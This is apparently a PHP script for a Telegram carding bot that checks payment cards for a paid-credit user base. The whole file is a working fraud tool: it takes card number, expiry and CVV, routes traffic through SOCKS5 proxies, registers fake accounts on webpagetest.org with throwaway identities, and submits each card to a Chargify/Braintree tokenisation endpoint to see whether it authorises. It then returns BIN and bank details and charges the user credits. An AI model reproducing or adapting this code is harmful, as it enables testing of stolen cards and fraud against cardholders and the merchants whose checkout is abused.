<?php
$start_time = microtime(true);

if ($text == '/chg') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Chargify+Braintree Auth+Charge - /chg \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < 1) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
include 'Tools/Antispam.php';

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$i = explode("|", $lista);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('bdfkjdgjdrtgbrhdtg'));
$last = ucfirst(str_shuffle('trbhrtbhtrfbh'));
$com = ucfirst(str_shuffle('waidfbfuu efreegwrb'));
$first1 = str_shuffle("kurumiapp85246");
$email = "$first1@gmail.com";

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

include 'Tools/Proxy.php';

#1. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'referer: https://www.webpagetest.org/',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$at = trim(strip_tags(getStr($curl1,'auth_token" value="','"')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
# 2 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=&auth_token='.$at.'&step=1&plan=MP5&billing-cycle=monthly');
$curl2 = curl_exec($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙂𝙤𝙞𝙣𝙜 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 3 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup/2',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first-name='.$F.'&last-name='.$L.'&company-name='.$C.'&email='.$E.'%40gmail.com&password=Joker%402019&confirm-password=Joker%402019&street-address=gardenia+drive+6767&city=San+Jose&state=CA&country=US&zipcode=92055&csrf_token=&auth_token='.$at.'&plan=MP5&step=2');
$curl3 = curl_exec($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 4 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://catchpoint.chargify.com/js/tokens.json');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'Content-Type: application/json',
'Host: catchpoint.chargify.com',
'Origin: https://js.chargify.com',
'Referer: https://js.chargify.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2022-12-05","credit_card":{"first_name":"jay","last_name":"mehta","full_number":"'.$cc.'","expiration_month":"'.$mon.'","expiration_year":"'.$year.'","cvv":"'.$cvv.'","device_data":"","billing_address":"gardenia drive 6767","billing_city":"San Jose","billing_state":"CA","billing_country":"US","billing_zip":"92055"},"origin":"https://www.webpagetest.org"}');
$curl4 = curl_exec($ch);
$rsp = trim(strip_tags(getStr($curl4,'errors":','}')));
curl_close($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

if (strpos($curl4, 'Approved (1000)'))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl4, '1000')) {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Card Authorized Charge Failed ( $rsp )\n--» <u>Gateway </u> : Chargify+Braintree Auth+Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl4, 'insufficient')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Card Authorized Charge Failed ( $rsp )\n--» <u>Gateway </u> : Chargify+Braintree Auth+Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else{
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $rsp ) \n--» <u>Gateway </u> : Chargify+Braintree Auth+Charge\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);

?>